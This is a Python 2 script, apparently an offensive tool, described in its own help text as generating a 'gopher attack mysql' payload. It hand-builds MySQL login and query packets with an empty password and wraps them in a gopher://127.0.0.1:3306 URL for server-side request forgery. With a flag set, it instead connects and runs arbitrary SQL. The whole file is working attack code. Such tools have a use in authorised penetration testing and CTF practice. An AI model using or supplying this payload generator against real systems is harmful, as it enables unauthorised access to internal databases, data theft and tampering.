# -*- coding:utf-8 -*-
from pwn import *
from struct import *
import urllib
import argparse
import hashlib
context.log_level = 'debug'


def xor(str1, str2):
    return ''.join([chr(ord(x[0]) ^ ord(x[1])) for x in zip(str1, str2)])

def sha1(str):
    return hashlib.sha1(str).digest()

def encrypt_pass(password, scramble):
    if password:
        hash1 = sha1(password)
        return xor(hash1, sha1(scramble + sha1(hash1)))
    else:
        return ""

def get_salt(data):
    packet_length = data[:3]
    packet_number = data[3:4]

    server_greeting = data[4:]
    protocol = server_greeting[:1]
    vlen = 0
    for i in server_greeting:
        if i == '\x00':
            break
        vlen += 1
    version = server_greeting[1:1+vlen]
    thread_id = server_greeting[1+vlen:5+vlen]
    scramble = server_greeting[5+vlen:13+vlen]
    caps_server = server_greeting[14+vlen:16+vlen]
    server_language = server_greeting[16+vlen:17+vlen]
    server_status = server_greeting[17+vlen:19+vlen]
    extcaps_server = server_greeting[19+vlen:21+vlen]
    auth_plugin_length = server_greeting[21+vlen:22+vlen]
    unused = server_greeting[22+vlen:32+vlen]
    scramble += server_greeting[32+vlen:44+vlen]

    # packet = {
    #     "packet_length": packet_length,
    #     "packet_number": packet_number,
    #     "version": version,
    #     "thread_id": thread_id,
    #     "caps_server": caps_server,
    #     "server_language": server_language,
    #     "server_status": server_status,
    #     "extcaps_server": extcaps_server,
    #     "auth_plugin_length": auth_plugin_length,
    #     "unused": unused,
    #     "scramble": scramble
    # }
    # print packet

    return scramble

def get_login_packet(scramble, username, password, database, packet_num='\x01'):
    packet = ''
    packet += '\x8D\xA6' #caps_client
    packet += '\x00' * 2 #extcaps_client
    packet += pack('I', 1024*1024*16) #max_packet
    packet += '\x21' #charset
    packet += '\x00' * 23 #unused
    packet += username + '\x00' #user
    password = encrypt_pass(password, scramble)
    print password.encode('hex')
    packet += chr(len(password)) + password #password
    packet += database + '\x00' #database
    packet = pack('<I', len(packet))[:3] + packet_num + packet

    return packet

def get_sql_packet(sql, packet_num='\x00'):
    packet = ''
    packet += '\x03'
    packet += sql
    packet = pack('<I', len(packet))[:3] + packet_num + packet

    return packet

def get_payload(username, database, payload):
    return get_login_packet('', username, '', database) + get_sql_packet(payload) + '\x00' * 4

parser = argparse.ArgumentParser(description='generate payload of gopher attack mysql')
parser.add_argument("-u", "--user", help="database user", required=True)
parser.add_argument("-d", "--database", help="select database", default="")
parser.add_argument("-t", "--target", dest="host", help="database host", default="127.0.0.1")
parser.add_argument("-p", "--password", help="database password default null", default="")
parser.add_argument("-P", "--payload", help="the sql you want to execute with out ';'", required=True)
parser.add_argument("-c", "--connect", help="connect your database", action="store_true")


if __name__ == '__main__':
    args = parser.parse_args()

    if args.connect:
        mysql = remote(args.host, 3306)
        server_handshake = mysql.recv(1024)
        scramble = get_salt(server_handshake)
        # print scramble.encode('hex')
        login = get_login_packet(scramble, args.user, args.password, args.database)
        mysql.send(login)
        mysql.recv(1024)
        mysql.send(get_sql_packet(args.payload))
        mysql.recv(1024)
    else:
        payload = get_payload(args.user, args.database, args.payload)
        print "gopher://127.0.0.1:3306/A" + urllib.quote(payload)


